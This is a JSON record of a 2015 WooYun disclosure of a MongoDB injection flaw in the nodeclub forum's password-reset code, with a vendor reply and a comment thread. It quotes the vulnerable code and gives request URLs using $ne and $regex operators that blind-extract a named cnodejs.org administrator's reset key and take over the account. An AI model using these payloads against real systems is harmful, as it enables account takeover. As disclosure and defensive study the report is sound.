{"id": 9633, "wybug_id": "wooyun-2015-0112230", "wybug_title": "nodeclub注入漏洞可重置用户密码 (mongodb盲注,cnodejs.org为例)", "wybug_corp": "cnodejs.org", "wybug_author": "多多关照", "wybug_date": "2015-05-05 20:52", "wybug_open_date": "2015-08-03 20:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述：  详细说明：  这个nodeclub(https://github.com/cnodejs/nodeclub/)可能用的人不多，弄着玩一下从github上下载nodeclub的源码。\\controllers\\sign.js\nexports.reset_pass = function (req, res, next) {  var key = req.query.key;  var name = req.query.name;  User.getUserByNameAndKey(name, key, function (err, user) {    if (!user) {      res.status(403);      return res.render('notify/notify', {error: '信息有误，密码无法重置。'});    }\n可以看到，key和name未经判断进入了 User的 getUserByNameAndKey\\proxy\\user.js\nexports.getUserByNameAndKey = function (loginname, key, callback) {  User.findOne({loginname: loginname, retrieve_key: key}, callback);};\n为了测试这个问题，首先，我们把目标定为 cnodejs 的管理者之一 alsotang，从他的github上可以知道他的邮箱是 alsotang@gmail.com然后在https://cnodejs.org/search_pass找回密码，\n\n接着，根据之前的问题，不难简单的构造出以下请求。https://cnodejs.org/reset_pass?name=alsotang&key[$ne]=111111111其中，name是目标用户名，让key不等于1111111，此时会返回一个正常的页面。\n\n如果，我们随便设置一个key，例如：https://cnodejs.org/reset_pass?name=alsotang&key=111111111则会返回一个错误的页面：\n\n如此一来，我们就可以对key参数通过 $regex来进行盲注。例如：https://cnodejs.org/reset_pass?name[$regex]=^alsotang&key[$regex]=^5  返回正常https://cnodejs.org/reset_pass?name[$regex]=^alsotang&key[$regex]=^6返回错误https://cnodejs.org/reset_pass?name[$regex]=^alsotang&key[$regex]=^5f返回正常....测试代码：见“测试代码”部分。运行程序后，\n\n跑出的key:\n\n然后拿着key去重置密码，密码被重置为 wooyun，登录后～～\n\n   漏洞证明：  见：https://cnodejs.org/user/alsotang 个人介绍。   修复方案：  exports.reset_pass = function (req, res, next) {  var key = req.query.key;    var name = req.query.name;..<-- 做处理，例如 validator.trim(req.query.key);   版权声明：转载请注明来源 多多关照@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-05 20:57 厂商回复： 一年前我与朋友干了这单：http://www.wooyun.org/bugs/wooyun-2010- 。也是 mongodb 的注入，没想到今天自己也被日了。T T不过能被 @路人甲 黑，真是荣幸啊！ 最新状态： 2015-05-05：已经修复啦~ 2015-05-05：咦？上面的网址怎么出不来 http://www.wooyun.org/bugs/wooyun-2010-086474  ", "replys": "漏洞评价：\n评论\n     2015-05-05 18:56 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  太帅了！果断加精！    \n     2015-05-05 19:12 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  关注...    \n     2015-05-05 19:22 |    \t\tmyhalo \t\t\t( 普通白帽子  |\t\t\t        Rank:281 漏洞数:55        | 所属团队:TSafe)\t\t \n  关注    \n     2015-05-05 20:05 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  mongodb盲注，mark    \n     2015-05-05 20:34 |    \t\tBlack_Sun \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 黑色阳光时刻照耀着我们)\t\t \n  我是 cnode 站长 alsotang。。。妈蛋域名不在我手上，想认领都难。    \n     2015-05-05 20:38 |    \t\tBlack_Sun \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 黑色阳光时刻照耀着我们)\t\t \n  搞错搞错。。在我手上。。马上认领    \n     2015-05-05 20:55 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  mongdb盲注实例出现了    \n     2015-05-05 21:23 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  mark    \n     2015-05-05 21:23 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  @Black_Sun 修复好了就公开给大家看看嘛    \n     2015-05-05 22:43 |    \t\t孤零落叶寒 \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:26        | 今天的跌倒是是为了明天更好的站着)\t\t \n  mark    \n     2015-05-06 08:14 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  疯狗赞赏的肯定不荣错过 收藏之。又一个白帽子沦为厂商，    \n     2015-05-06 13:03 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  过程相当精彩！    \n     2015-05-09 12:32 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  二哥真是牛逼！    \n     2015-05-09 15:00 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  厂商牛逼啊！！！    \n     2015-05-10 00:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  厂商是 @0x_Jin     \n     2015-05-10 13:49 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @px1624 额 那是我基友.... 我并不是cnode的    \n     2015-05-10 22:45 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @0x_Jin 额。。    \n     2015-05-13 15:46 |    \t\t美囤妈妈(乌云厂商)\t\t \n  新厂商入驻，欢迎各位白帽子光临！同时我们招聘安全主管，有兴趣的联系我！    \n     2015-05-13 20:51 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-06-07 09:43 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @美囤妈妈 2015-05-17 给 小川 发送礼物 2015-05-16 给 bey0nd 发送礼物 2015-05-16 给 小龙 发送礼物 2015-05-16 给 milan 发送礼物 2015-05-16 给 Ton7BrEak 发送礼物 都送啥好东西了 有婴儿用品吗 打开主页没有挖洞的欲望到勾起了我疯狂购物的欲望 哈哈 不错的市场定位    \n     2015-06-17 12:46 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  这都6.17了。还没有新状态    \n     2015-06-30 11:40 |    \t\t美囤妈妈(乌云厂商)\t\t \n  @abaddon 母婴垂直电商，婴儿用品必须有！    \n     2015-08-04 10:33 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这样可以注啊，头一次见    \n     2015-08-06 13:43 |    \t\t黑色雨滴 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 没有主页新手一个前来玩玩)\t\t \n  碉堡了。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}